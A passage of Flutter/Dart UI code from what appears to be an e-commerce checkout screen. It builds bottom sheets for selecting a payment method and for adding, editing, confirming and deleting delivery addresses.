                          itemCount: addressList.length + 1,
                        ),
                      ),
                    ),
                    afterChangeButton(
                        name: ""Apply"", onClick: () => Navigator.pop(context)),
                  ],
                );
              },
            );
          },
        );
      },
    );
  }

  void paymentSheet() {
    showModalBottomSheet(
        isScrollControlled: true,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
        ),
        context: context,
        builder: (context) {
          return DraggableScrollableSheet(
            controller: dragC,
            // initialChildSize: iconItems != null && (0.109 * iconItems!.length) < 1
            //     ? 0.109 * iconItems!.length
            //     : 0.96,
            initialChildSize: 0.45,
            minChildSize: 0.45,
            maxChildSize: 0.96,
            expand: false,
            snap: true,
            builder: (BuildContext context, ScrollController scrollController) {
              return StatefulBuilder(
                builder: (context, setState) {
                  return Column(
                    children: <Widget>[
                      Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        decoration:
                            const BoxDecoration(color: Color(0xfff8faf7)),
                        child: Column(
                          children: <Widget>[
                            Center(
                              child: Container(
                                margin: const EdgeInsets.only(top: 8),
                                color: activeBgColor,
                                width: 100,
                                height: 4,
                              ),
                            ),
                            Padding(
                              padding: const EdgeInsets.only(
                                  left: 20.0,
                                  right: 20.0,
                                  top: 24.0,
                                  bottom: 12.0),
                              child: Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  /// Bottom sheet title text
                                  Expanded(
                                      child: Text(""Payment List"",
                                          style: inter28Bold())),
                                  Align(
                                    alignment: Alignment.centerRight,
                                    child: InkWell(
                                      onTap: () {
                                        FocusScope.of(context).unfocus();
                                        Navigator.of(context).pop(null);
                                      },
                                      child: const Icon(Icons.close),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),

                      /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                      Expanded(
                        child: ListView.separated(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 20, vertical: 8),
                          // shrinkWrap: true,
                          scrollDirection: Axis.horizontal,
                          itemBuilder: (context, index) {
                            return paymentBox(
                                borderRadius: 12,
                                width: 178,
                                imagePath: paymentFileList[index],
                                groupValue: payment1Value,
                                value: paymentList[index]);
                          },
                          separatorBuilder: (context, index) =>
                              const SizedBox(width: 12),
                          itemCount: paymentList.length,
                        ),
                      ),
                      afterChangeButton(
                          name: ""Apply"", onClick: () => Navigator.pop(context)),
                    ],
                  );
                },
              );
            },
          );
        });
  }

  Widget paymentBox({
    required double borderRadius,
    double? height,
    double? width,
    required String imagePath,
    required String? groupValue,
    required String value,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      height: height,
      width: width,
      decoration: BoxDecoration(
        color: secondaryBlue,
        borderRadius: BorderRadius.circular(borderRadius),
      ),
      child: Row(
        children: [
          Expanded(
            flex: 1,
            child: Radio(
              fillColor: MaterialStateProperty.all(primaryBlue),
              groupValue: groupValue,
              value: value,
              onChanged: (val) => setState(() => groupValue = val.toString()),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            flex: 9,
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: <Widget>[
                Text(value, style: inter14Bold()),
                const SizedBox(height: 4),
                Image.asset(""$iconsCheckoutPath$imagePath""),
                const SizedBox(height: 4),
              ],
            ),
          ),
        ],
      ),
    );
  }

  editAddressSheet({required int index}) {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: editAddressC,
          initialChildSize: 0.82,
          minChildSize: 0.82,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Consumer(builder: (context, ref, child) {
                  AccountAddressState state = ref.watch(accountAddressNotifier);
                  final editAddressNotifer =
                      ref.watch(accountAddressNotifier.notifier);
                  return Padding(
                    padding: EdgeInsets.only(
                        bottom: MediaQuery.of(context).viewInsets.bottom),
                    child: Column(
                      children: <Widget>[
                        Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          decoration:
                              const BoxDecoration(color: Color(0xfff8faf7)),
                          child: Column(
                            children: <Widget>[
                              Center(
                                child: Container(
                                  margin: const EdgeInsets.only(top: 8),
                                  color: activeBgColor,
                                  width: 100,
                                  height: 4,
                                ),
                              ),
                              Padding(
                                padding: const EdgeInsets.only(
                                    left: 20.0,
                                    right: 20.0,
                                    top: 24.0,
                                    bottom: 12.0),
                                child: Row(
                                  children: [
                                    /// Bottom sheet title text
                                    Expanded(
                                        flex: 5,
                                        child: Text(""Edit Address"",
                                            style: inter28Bold())),
                                    Expanded(
                                      flex: 5,
                                      child: Row(
                                        mainAxisAlignment:
                                            MainAxisAlignment.end,
                                        children: [
                                          InkWell(
                                            onTap: () =>
                                                deleteConfirmAddressSheet(
                                                    index: index),
                                            child: SvgPicture.asset(
                                                ""${iconsPath}trash.svg"",
                                                color: red),
                                          ),
                                          const SizedBox(width: 16),
                                          InkWell(
                                            onTap: closeConfirmEditAddressSheet,
                                            child: const Icon(Icons.close),
                                          )
                                        ],
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),

                        /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                        Expanded(
                          child: ListView(
                            controller: scrollController,
                            children: <Widget>[
                              Padding(
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 20),
                                child: Row(
                                  children: [
                                    Text(""Address Labels"",
                                        style: inter14Medium()),
                                    Text(""*"", style: inter14MediumRed()),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 8),
                              Padding(
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 20),
                                child: Row(
                                  children: [
                                    addressLabel(
                                        title: ""Home"",
                                        value: home,
                                        onClick: () =>
                                            setState(() => home = true)),
                                    const SizedBox(width: 12),
                                    addressLabel(
                                        title: ""Office"",
                                        value: !home,
                                        onClick: () =>
                                            setState(() => home = false)),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 12),
                              fieldAddress(
                                required: true,
                                name: ""Recipient's Name"",
                                hint: ""Recipient's Name"",
                                controller: recipientC,
                                error: state.recipient.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      recipient:
                                          state.recipient.copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.recipient.value,
                                      fieldEmpty: state.recipient.isEmpty,
                                      fieldErrorMsg:
                                          state.recipient.errorMessage,
                                      errorMsg: ""Nama Recepient harus diisi"",
                                      type: ""recipient"");
                                },
                              ),
                              // const SizedBox(height: 16),
                              fieldAddress(
                                required: true,
                                name: ""Mobile Phone Number"",
                                hint: ""Mobile Phone Number"",
                                controller: phoneNumberC,
                                error: state.phoneNumber.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      phoneNumber: state.phoneNumber
                                          .copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.phoneNumber.value,
                                      fieldEmpty: state.phoneNumber.isEmpty,
                                      fieldErrorMsg:
                                          state.phoneNumber.errorMessage,
                                      errorMsg: ""Nomor HP harus diisi"",
                                      type: ""phoneNumber"");
                                },
                              ),
                              // const SizedBox(height: 16),
                              fieldAddress(
                                required: true,
                                name: ""Complete Address"",
                                hint: ""Complete Address"",
                                controller: addressC,
                                error: state.address.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      address:
                                          state.address.copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.address.value,
                                      fieldEmpty: state.address.isEmpty,
                                      fieldErrorMsg: state.address.errorMessage,
                                      errorMsg: ""Alamat harus diisi"",
                                      type: ""address"");
                                },
                              ),
                            ],
                          ),
                        ),
                        afterChangeButton(
                            name: ""Save"",
                            onClick: () {
                              editAddressNotifer.checkField(
                                  val: state.recipient.value,
                                  fieldEmpty: state.recipient.isEmpty,
                                  fieldErrorMsg: state.recipient.errorMessage,
                                  errorMsg: ""Nama Recepient harus diisi"",
                                  type: ""recipient"");
                              editAddressNotifer.checkField(
                                  val: state.phoneNumber.value,
                                  fieldEmpty: state.phoneNumber.isEmpty,
                                  fieldErrorMsg: state.phoneNumber.errorMessage,
                                  errorMsg: ""Nomor HP harus diisi"",
                                  type: ""phoneNumber"");
                              editAddressNotifer.checkField(
                                  val: state.address.value,
                                  fieldEmpty: state.address.isEmpty,
                                  fieldErrorMsg: state.address.errorMessage,
                                  errorMsg: ""Alamat harus diisi"",
                                  type: ""address"");
                              if (state.recipient.value != """" &&
                                  state.phoneNumber.value != """" &&
                                  state.address.value != """") {
                                editConfirmAddressSheet(index: index);
                              }
                            }),
                      ],
                    ),
                  );
                });
              },
            );
          },
        );
      },
    );
  }

  editConfirmAddressSheet({required int index}) {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: editAddressConfirmC,
          initialChildSize: 0.47,
          minChildSize: 0.1,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Consumer(builder: (context, ref, child) {
                  AccountAddressState state = ref.watch(accountAddressNotifier);
                  final editAddressNotifer =
                      ref.watch(accountAddressNotifier.notifier);
                  return Column(
                    children: <Widget>[
                      Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        decoration:
                            const BoxDecoration(color: Color(0xfff8faf7)),
                        child: Column(
                          children: <Widget>[
                            Center(
                              child: Container(
                                margin: const EdgeInsets.only(top: 8),
                                color: activeBgColor,
                                width: 100,
                                height: 4,
                              ),
                            ),
                          ],
                        ),
                      ),

                      /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                      Expanded(
                        child: Column(
                          children: <Widget>[
                            Padding(
                              padding: const EdgeInsets.all(20),
                              child: Text(
                                ""It looks like you've made some changes to the existing data. Do you want to save these changes before continuing ?"",
                                style: inter16Bold(),
                                textAlign: TextAlign.center,
                              ),
                            ),
                            Padding(
                              padding: const EdgeInsets.fromLTRB(20, 0, 20, 0),
                              child: Text(
                                ""By pressing yes, the data changes you make will be saved"",
                                style: inter14Black2(),
                                textAlign: TextAlign.center,
                              ),
                            ),
                            // const SizedBox(height: 16),
                          ],
                        ),
                      ),
                      afterChangeDoubleButton(
                        name1: ""Yes, I want to save data"",
                        name2: ""No, I want to check the data"",
                        onClick1: () {
                          List<AddressModel> temp = [];
                          for (int i = 0; i < addressList.length; i++) {
                            if (i == index) {
                              temp.add(AddressModel(
                                  label: state.label,
                                  name: state.recipient.value,
                                  phoneNumber: state.phoneNumber.value,
                                  completeAddress: state.address.value));
                              continue;
                            }
                            temp.add(AddressModel(
                                label: addressList[i].label,
                                name: addressList[i].name,
                                phoneNumber: addressList[i].phoneNumber,
                                completeAddress:
                                    addressList[i].completeAddress));
                          }
                          addressList = temp;
                          userData['address'] = addressList;
                          final updateaccount =
                              ref.read(accountNotifier.notifier);
                          updateaccount.updateUser(userData: userData);
                          // setState;
                          showToast(""Data changes have been successfully saved"",
                              context);

                          Navigator.pop(context);
                          Navigator.pop(context);
                        },
                        onClick2: () {
                          Navigator.pop(context);
                        },
                      ),
                    ],
                  );
                });
              },
            );
          },
        );
      },
    );
  }

  closeConfirmEditAddressSheet() {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: editAddressCloseConfirmC,
          initialChildSize: 0.4,
          minChildSize: 0.1,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Column(
                  children: <Widget>[
                    Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      decoration: const BoxDecoration(color: Color(0xfff8faf7)),
                      child: Column(
                        children: <Widget>[
                          Center(
                            child: Container(
                              margin: const EdgeInsets.only(top: 8),
                              color: activeBgColor,
                              width: 100,
                              height: 4,
                            ),
                          ),
                        ],
                      ),
                    ),

                    /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                    Expanded(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(20),
                            child: Text(
                              ""Are you sure to close the edit form ?"",
                              style: inter16Bold(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.fromLTRB(20, 0, 20, 0),
                            child: Text(
                              ""closing the edit form will cancel the changes made"",
                              style: inter14Black2(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          // const SizedBox(height: 16),
                        ],
                      ),
                    ),
                    afterChangeDoubleButton(
                      name1: ""Yes, I want to close the edit form"",
                      name2: ""No, I want to go back to editing"",
                      onClick1: () {
                        Navigator.of(context)
                          ..pop()
                          ..pop();
                      },
                      onClick2: () {
                        showToast(""Data changes have been successfully saved"",
                            context);
                        Navigator.pop(context);
                      },
                    ),
                  ],
                );
              },
            );
          },
        );
      },
    );
  }

  closeConfirmAddAddressSheet() {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: addAddressCloseConfirmC,
          initialChildSize: 0.4,
          minChildSize: 0.1,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Column(
                  children: <Widget>[
                    Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      decoration: const BoxDecoration(color: Color(0xfff8faf7)),
                      child: Column(
                        children: <Widget>[
                          Center(
                            child: Container(
                              margin: const EdgeInsets.only(top: 8),
                              color: activeBgColor,
                              width: 100,
                              height: 4,
                            ),
                          ),
                        ],
                      ),
                    ),

                    /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                    Expanded(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(20),
                            child: Text(
                              ""Are you sure you want to close the add data form?"",
                              style: inter16Bold(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.fromLTRB(20, 0, 20, 0),
                            child: Text(
                              ""Pressing the yes button, will cancel adding data"",
                              style: inter14Black2(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          // const SizedBox(height: 16),
                        ],
                      ),
                    ),
                    afterChangeDoubleButton(
                      name1: ""Yes, I canceled adding data"",
                      name2: ""No, I continue to add data"",
                      onClick1: () {
                        Navigator.of(context)
                          ..pop()
                          ..pop();
                      },
                      onClick2: () {
                        showToast(""Data changes have been successfully added"",
                            context);
                        Navigator.pop(context);
                      },
                    ),
                  ],
                );
              },
            );
          },
        );
      },
    );
  }

  deleteConfirmAddressSheet({required int index}) {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: deleteAddressConfirmC,
          initialChildSize: 0.4,
          minChildSize: 0.1,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Column(
                  children: <Widget>[
                    Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      decoration: const BoxDecoration(color: Color(0xfff8faf7)),
                      child: Column(
                        children: <Widget>[
                          Center(
                            child: Container(
                              margin: const EdgeInsets.only(top: 8),
                              color: activeBgColor,
                              width: 100,
                              height: 4,
                            ),
                          ),
                        ],
                      ),
                    ),

                    /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                    Expanded(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(20),
                            child: Text(
                              ""Are you sure you delete this data?"",
                              style: inter16Bold(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.fromLTRB(20, 0, 20, 0),
                            child: Text(
                              ""Pressing the Yes button will delete the data permanently"",
                              style: inter14Black2(),
                              textAlign: TextAlign.center,
                            ),
                          ),
                          // const SizedBox(height: 16),
                        ],
                      ),
                    ),
                    afterChangeDoubleButton(
                      name1: ""Yes, I want to delete this data"",
                      name2: ""No, I want to go back to editing data"",
                      onClick1: () {
                        addressList.removeAt(index);
                        showToast(""Data deleted successfully"", context);
                        // setState;
                        Navigator.of(context)
                          ..pop()
                          ..pop()
                          ..pop();
                      },
                      onClick2: () {
                        Navigator.pop(context);
                      },
                    ),
                  ],
                );
              },
            );
          },
        );
      },
    );
  }

  Widget afterChangeButton({required String name, Function()? onClick}) {
    return Container(
      color: Colors.white,
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 16),
      child: ElevatedButton(
        style: ButtonStyle(
            padding: MaterialStateProperty.all(
                const EdgeInsets.symmetric(vertical: 16)),
            // shadowColor: MaterialStateProperty.all<Color>(Colors.transparent),
            fixedSize: MaterialStateProperty.all(
                Size(MediaQuery.of(context).size.width, 52)),
            shape: MaterialStateProperty.all(
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            backgroundColor: MaterialStateProperty.all(primaryBlue)),
        onPressed: onClick,
        child: Text(
          name,
          style: inter16BoldWhite(),
        ),
      ),
    );
  }

  Widget afterChangeDoubleButton(
      {required String name1,
      required String name2,
      Function()? onClick1,
      Function()? onClick2}) {
    return Container(
      color: Colors.white,
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 16),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.end,
        children: <Widget>[
          ElevatedButton(
            style: ButtonStyle(
                padding: MaterialStateProperty.all(
                    const EdgeInsets.symmetric(vertical: 16)),
                // shadowColor: MaterialStateProperty.all<Color>(Colors.transparent),
                fixedSize: MaterialStateProperty.all(
                    Size(MediaQuery.of(context).size.width, 52)),
                shape: MaterialStateProperty.all(RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8))),
                backgroundColor: MaterialStateProperty.all(primaryBlue)),
            onPressed: onClick1,
            child: Text(
              name1,
              style: inter16BoldWhite(),
            ),
          ),
          const SizedBox(height: 12),
          ElevatedButton(
            style: ButtonStyle(
                padding: MaterialStateProperty.all(
                    const EdgeInsets.symmetric(vertical: 16)),
                // shadowColor: MaterialStateProperty.all<Color>(Colors.transparent),
                fixedSize: MaterialStateProperty.all(
                    Size(MediaQuery.of(context).size.width, 52)),
                shape: MaterialStateProperty.all(RoundedRectangleBorder(
                    side: BorderSide(color: primaryBlue),
                    borderRadius: BorderRadius.circular(8))),
                backgroundColor: MaterialStateProperty.all(white)),
            onPressed: onClick2,
            child: Text(
              name2,
              style: inter16Bold(),
            ),
          )
        ],
      ),
    );
  }

  Widget addressBox({
    required String? groupValue,
    required String value,
    required String addressName,
    required String name,
    required String phone,
    required String address,
    required int index,
  }) {
    return Container(
      // height: 98,
      width: 90.w,
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      decoration: BoxDecoration(
        color: secondaryBlue,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Row(
        children: [
          Expanded(
            flex: 1,
            child: Radio(
              fillColor: MaterialStateProperty.all(primaryBlue),
              groupValue: groupValue,
              value: value,
              onChanged: (val) => setState(() => groupValue = val.toString()),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            flex: 9,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: <Widget>[
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(addressName, style: inter14Bold()),
                    InkWell(
                      onTap: () => editAddressSheet(index: index),
                      child: SvgPicture.asset(
                        '${iconsAccountPath}edit.svg',
                        width: 15,
                        height: 15,
                      ),
                    )
                  ],
                ),
                const SizedBox(height: 4),
                Row(
                  children: <Widget>[
                    Expanded(
                      flex: 3,
                      child: Text(""Name"", style: inter12BoldBlack2()),
                    ),
                    Expanded(
                      flex: 7,
                      child: Text("": $name"", style: inter12MediumBlack2()),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Row(
                  children: <Widget>[
                    Expanded(
                      flex: 3,
                      child: Text(""Phone"", style: inter12BoldBlack2()),
                    ),
                    Expanded(
                      flex: 7,
                      child: Text("": $phone"", style: inter12MediumBlack2()),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Row(
                  children: <Widget>[
                    Expanded(
                      flex: 3,
                      child: Text(""Address"", style: inter12BoldBlack2()),
                    ),
                    Expanded(
                      flex: 7,
                      child: Text(
                        "": $address"",
                        style: inter12MediumBlack2(),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget addAddress() {
    return InkWell(
      onTap: addAddressSheet,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
        decoration: BoxDecoration(
          color: secondaryBlue,
          borderRadius: BorderRadius.circular(12),
        ),
        child: Column(
          children: <Widget>[
            const SizedBox(height: 8),
            SvgPicture.asset(""${iconsCheckoutPath}add_address.svg""),
            const SizedBox(height: 16),
            Text(""Add Address"", style: inter14Medium()),
          ],
        ),
      ),
    );
  }

  Widget addressLabel(
      {required String title, Function()? onClick, bool value = false}) {
    return InkWell(
      onTap: onClick,
      child: Container(
        height: 44,
        padding: const EdgeInsets.symmetric(horizontal: 8),
        decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(8),
            color: value ? secondaryBlue : white,
            border: Border.all(color: primaryBlue)),
        child: Center(child: Text(title, style: inter14Medium())),
      ),
    );
  }
}
"
